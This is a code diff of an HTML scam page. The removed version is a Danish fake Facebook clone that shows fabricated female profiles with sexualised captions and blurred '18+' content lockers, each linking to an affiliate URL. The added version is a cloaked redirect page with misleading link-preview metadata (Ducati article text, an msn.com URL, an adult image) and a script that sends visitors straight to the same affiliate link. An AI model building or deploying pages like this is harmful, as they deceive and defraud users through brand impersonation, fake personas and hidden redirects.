@@ -1,250 +1,38 @@
 <!DOCTYPE html>
-<html lang="da">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Profiler</title>
-    
-    <style>
-        /* =========================================
-           FACEBOOK CLONE UI & CONTENT LOCKER
-           ========================================= */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; color: #1c1e21; overflow-x: hidden; }
-        
-        /* FB NAV BAR */
-        .fb-nav { background: #ffffff; height: 56px; display: flex; align-items: center; padding: 0 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
-        .fb-logo { font-size: 24px; font-weight: bold; color: #1877f2; text-decoration: none; letter-spacing: -1px; }
-        .nav-search { background: #f0f2f5; border-radius: 50px; padding: 8px 15px; margin-left: 10px; color: #65676b; font-size: 14px; width: 100%; max-width: 250px; }
+    <title>(45+) MAIL</title>
+    <link rel="stylesheet" href="style.css">
+	
+	<!-- This site is optimized with the Yoast SEO -->
+    <meta name="description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S, coming up with a bike that weighs a claimed 445 pounds dry. The full electronics suite gives riders options for Sport, Touring, Urban, and Enduro riding, and of course, we can’t forget the Ducati Skyhook Suspension EVO on the V2 S.">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Prime options for when you want to crunch miles, not vertebrae.">
+    <meta property="og:description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S, coming up with a bike that weighs a claimed 445 pounds dry. The full electronics suite gives riders options for Sport, Touring, Urban, and Enduro riding, andz of course, we can’t forget the Ducati Skyhook Suspension EVO on the V2 S.">
+    <meta property="og:url" content="https://www.msn.com/">
+    <meta property="og:site_name" content=">CamSoda<">
+    <meta property="article:modified_time" content="2023-03-17T05:51:53+00:00">
+    <meta property="og:image" content="https://c4.wallpaperflare.com/wallpaper/527/642/440/adult-babe-beautiful-brunette-wallpaper-preview.jpg">
+    <meta property="og:image:width" content="608">
+    <meta property="og:image:height" content="405">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Prime options for when you want to crunch miles, not vertebrae.">
+    <meta name="twitter:description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S, coming up with a bike that weighs a claimed 445 pounds dry. The full electronics suite gives riders options for Sport, Touring, Urban, and Enduro riding, and of course, we can’t forget the Ducati Skyhook Suspension EVO on the V2 S.">
+    <meta name="twitter:image" content="https://c4.wallpaperflare.com/wallpaper/527/642/440/adult-babe-beautiful-brunette-wallpaper-preview.jpg">
+    <meta name="twitter:label1" content="Est. reading time">
+    <meta name="twitter:data1" content="4 minutes">
+	<!-- / Yoast SEO plugin. -->
 
-        /* HOMEPAGE GRID (SUGGESTED FRIENDS) */
-        .container { max-width: 800px; margin: 20px auto; padding: 0 15px; }
-        .section-title { font-size: 20px; font-weight: bold; margin-bottom: 15px; color: #050505; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
-        
-        .user-card { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.2); cursor: pointer; border: 1px solid #ddd; }
-        .user-card img { width: 100%; height: 140px; object-fit: cover; }
-        .user-card-info { padding: 10px; text-align: center; }
-        .user-card-name { font-weight: 600; font-size: 14px; color: #050505; }
-        .user-card-btn { background: #e7f3ff; color: #1877f2; border: none; padding: 6px; width: 100%; border-radius: 6px; margin-top: 8px; font-weight: 600; font-size: 13px; cursor: pointer; }
-
-        /* FULLSCREEN PROFILE MODAL */
-        .profile-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f0f2f5; z-index: 1000; overflow-y: auto; }
-        .back-btn { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.5); color: #fff; border: none; padding: 8px 15px; border-radius: 20px; z-index: 1010; font-weight: bold; cursor: pointer; backdrop-filter: blur(5px); }
-        
-        /* PROFILE HEADER */
-        .profile-top { background: #fff; box-shadow: 0 1px 2px rgba(0,0,0,0.1); padding-bottom: 15px; }
-        .cover-photo { width: 100%; height: 200px; background: #cbd2d9 url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2000&auto=format&fit=crop') center/cover; position: relative; }
-        .profile-avatar-wrapper { width: 140px; height: 140px; border-radius: 50%; border: 4px solid #fff; margin: -70px auto 0; position: relative; z-index: 2; background: #fff; }
-        .profile-avatar { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
-        .profile-name { text-align: center; font-size: 24px; font-weight: 700; margin-top: 10px; color: #050505; }
-        .profile-bio { text-align: center; color: #65676b; font-size: 14px; margin: 5px 20px; }
-        
-        .fb-action-btns { display: flex; gap: 10px; justify-content: center; margin-top: 15px; padding: 0 20px; }
-        .fb-btn { padding: 8px 0; border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: pointer; flex: 1; text-align: center; text-decoration: none; }
-        .btn-add { background: #1877f2; color: #fff; }
-        .btn-msg { background: #e4e6eb; color: #050505; }
-
-        /* POST TIMELINE */
-        .timeline { max-width: 600px; margin: 15px auto; padding: 0 10px; }
-        .post { background: #fff; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); overflow: hidden; }
-        .post-header { display: flex; align-items: center; padding: 12px; }
-        .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-right: 10px; object-fit: cover; }
-        .post-author { font-weight: 600; font-size: 15px; color: #050505; display: block; }
-        .post-time { font-size: 12px; color: #65676b; display: flex; align-items: center; gap: 4px; }
-        .post-text { padding: 0 12px 10px; font-size: 15px; color: #050505; line-height: 1.4; }
-        
-        /* THE LOCKER TRICK */
-        .locked-content { position: relative; width: 100%; height: 350px; background: #000; display: flex; justify-content: center; align-items: center; cursor: pointer; text-decoration: none; overflow: hidden; }
-        .locked-content img { width: 100%; height: 100%; object-fit: cover; filter: blur(25px) brightness(0.7); transform: scale(1.1); }
-        .lock-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2; padding: 20px; text-align: center; }
-        .lock-icon { font-size: 50px; margin-bottom: 10px; filter: drop-shadow(0 2px 5px rgba(0,0,0,0.5)); }
-        .lock-title { color: #fff; font-size: 18px; font-weight: bold; text-shadow: 0 2px 4px rgba(0,0,0,0.8); margin-bottom: 5px; }
-        .lock-desc { color: #ddd; font-size: 13px; margin-bottom: 15px; max-width: 80%; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
-        .unlock-btn { background: #ff2a5f; color: #fff; padding: 10px 20px; border-radius: 6px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 10px rgba(255, 42, 95, 0.4); border: 1px solid #ff2a5f; }
-        
-        .post-stats { padding: 10px 12px; border-bottom: 1px solid #ced0d4; font-size: 13px; color: #65676b; display: flex; justify-content: space-between; }
-        .post-actions { display: flex; justify-content: space-between; padding: 4px 12px; }
-        .action-btn { flex: 1; text-align: center; padding: 8px 0; color: #65676b; font-weight: 600; font-size: 14px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 6px; text-decoration: none; }
-        
-        @media (max-width: 480px) {
-            .grid { grid-template-columns: repeat(2, 1fr); }
-            .cover-photo { height: 150px; }
-            .locked-content { height: 280px; }
-        }
-    </style>
 </head>
+
 <body>
-
-    <div class="fb-nav">
-        <a href="#" class="fb-logo">facebook</a>
-        <div class="nav-search">🔍 Søg efter venner...</div>
-    </div>
-
-    <div class="container">
-        <div class="section-title">Personer, du måske kender</div>
-        <div class="grid" id="homepageGrid"></div>
-    </div>
-
-    <!-- PROFILE MODAL -->
-    <div id="profileModal" class="profile-modal">
-        <button class="back-btn" onclick="closeProfile()">⬅ Tilbage</button>
-        
-        <div class="profile-top">
-            <div class="cover-photo"></div>
-            <div class="profile-avatar-wrapper">
-                <img src="" id="pAvatar" class="profile-avatar">
-            </div>
-            <h1 class="profile-name"><span id="pName">Name</span></h1>
-            <p class="profile-bio">📍 Bor i Danmark • 🎓 Studerer • 💌 Kun for sjov</p>
-            
-            <div class="fb-action-btns">
-                <a href="https://t.taffizerq.com/719iel" target="_blank" class="fb-btn btn-add">🔒 Lås Profil Op</a>
-                <a href="https://t.taffizerq.com/719iel" target="_blank" class="fb-btn btn-msg">Besked</a>
-            </div>
-        </div>
-
-        <div class="timeline" id="timelineContainer">
-            <!-- 30 Posts will be generated here -->
-        </div>
-    </div>
-
     <script>
-        // ALL 36 IMAGES PROVIDED BY YOU
-        const allImages = [
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafd6212320b.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafcae692d2c.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafc930da7d6.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafbe3fc1960.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafb9e5a7fc5.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafb12fc3117.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf934c26dee.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf445819aa1.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf376edf756.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf17e56f793.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf12db448e5.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faeff2b47920.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faee27525158.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faece2309a62.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faead4ae3571.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fae8e424e078.jpeg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images4.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images%201.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/ZUQYQVFNR3-thumb.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/Z5CJD4WFFK.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/WZT9ONOAVQ.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/T4APYLQ1UD.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/QYVIU1LTLK-thumb.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/GsKNHUXXsAA_z4C.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/HE7LupIXEAA2xnS.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/EhU-uxVU4AEV_-n.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/Edtlj7HUcAERuPf.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/C2CDnINUsAArk4M.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/918ef2fd-89ae-4629-97c1-46aed0bcf444.webp?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/8cd9b917-2a23-4f57-84a3-bf06bc59ff04.webp?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/22.jpg?raw=true",
-            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/15.jpg?raw=true"
-        ];
-
-        // Danish Female Names
-        const danishNames = ["Emma Nielsen", "Ida Jensen", "Clara Hansen", "Sofia Pedersen", "Freja Andersen", "Josefine Christensen", "Alma Larsen", "Ella Sørensen", "Anna Rasmussen", "Isabella Jørgensen", "Laura Petersen", "Mathilde Madsen"];
-        const cpaLink = "https://t.taffizerq.com/719iel";
-
-        // Daily life captions in Danish
-        const dailyCaptions = [
-            "Slapper af derhjemme i dag... 🛋️ Har I en god weekend?",
-            "Lige kommet ud af badet 🚿 Se min nye video nedenfor...",
-            "Klar til i aften 🍷 Hvem vil holde mig med selskab?",
-            "Savner nogen at putte med... ❤️ Skriv til mig privat.",
-            "Min nye bikini kom i dag! 👙 Hvad synes I om farven?",
-            "Ups, slettede næsten denne video 🙈 Heldigvis gemte jeg den til jer.",
-            "Godmorgen skat 💋 Tjek min seneste opdatering.",
-            "Træning overstået! 💦 Føler mig fantastisk.",
-            "Keder mig lidt i aften... 🥺",
-            "Tilføjede lige noget helt specielt til VIP galleriet 🔥"
-        ];
-
-        // 1. Generate 36 Profiles on the Homepage
-        const grid = document.getElementById('homepageGrid');
-        
-        allImages.forEach((imgUrl, index) => {
-            let randomName = danishNames[index % danishNames.length];
-            // Render card
-            grid.innerHTML += `
-                <div class="user-card" onclick="openProfile('${imgUrl}', '${randomName}')">
-                    <img src="${imgUrl}" alt="Profile Image">
-                    <div class="user-card-info">
-                        <div class="user-card-name">${randomName}</div>
-                        <button class="user-card-btn">Tilføj ven</button>
-                    </div>
-                </div>
-            `;
-        });
-
-        // 2. Open Profile and Generate 30 Posts
-        function openProfile(imgUrl, name) {
-            document.getElementById('profileModal').style.display = 'block';
-            document.body.style.overflow = 'hidden'; // Lock background scrolling
-            
-            // Set Headers
-            document.getElementById('pAvatar').src = imgUrl;
-            document.getElementById('pName').innerText = name;
-            
-            // Generate Timeline (30 posts)
-            const timeline = document.getElementById('timelineContainer');
-            timeline.innerHTML = ''; // Clear previous
-
-            for (let i = 0; i < 30; i++) {
-                let caption = dailyCaptions[Math.floor(Math.random() * dailyCaptions.length)];
-                let likes = Math.floor(Math.random() * 800) + 50;
-                let comments = Math.floor(Math.random() * 100) + 5;
-                let hoursAgo = i === 0 ? "Lige nu" : `${i * 2} timer siden`;
-
-                timeline.innerHTML += `
-                    <div class="post">
-                        <div class="post-header">
-                            <img src="${imgUrl}" alt="Avatar">
-                            <div>
-                                <span class="post-author">${name}</span>
-                                <span class="post-time">${hoursAgo} • 🌎</span>
-                            </div>
-                        </div>
-                        <div class="post-text">${caption}</div>
-                        
-                        <!-- THE AGGRESSIVE CONTENT LOCKER -->
-                        <a href="${cpaLink}" target="_blank" class="locked-content">
-                            <img src="${imgUrl}" alt="Blurred Content">
-                            <div class="lock-overlay">
-                                <div class="lock-icon">🔒</div>
-                                <div class="lock-title">18+ Sensitivt Indhold Låst</div>
-                                <div class="lock-desc">Dette medie kan indeholde voksenindhold. Bekræft din alder for at se det ucenstreret.</div>
-                                <div class="unlock-btn">🔓 Bekræft Alder (18+)</div>
-                            </div>
-                        </a>
-                        
-                        <div class="post-stats">
-                            <span>👍❤️ ${likes}</span>
-                            <span>${comments} kommentarer</span>
-                        </div>
-                        <div class="post-actions">
-                            <a href="${cpaLink}" target="_blank" class="action-btn">👍 Synes godt om</a>
-                            <a href="${cpaLink}" target="_blank" class="action-btn">💬 Kommenter</a>
-                            <a href="${cpaLink}" target="_blank" class="action-btn">↪ Del</a>
-                        </div>
-                    </div>
-                `;
-            }
-        }
-
-        // Close Profile
-        function closeProfile() {
-            document.getElementById('profileModal').style.display = 'none';
-            document.body.style.overflow = 'auto'; // Unlock scrolling
-        }
+        // Instant redirect
+        window.location.href = "https://t.taffizerq.com/719iel";
     </script>
 </body>
 </html>
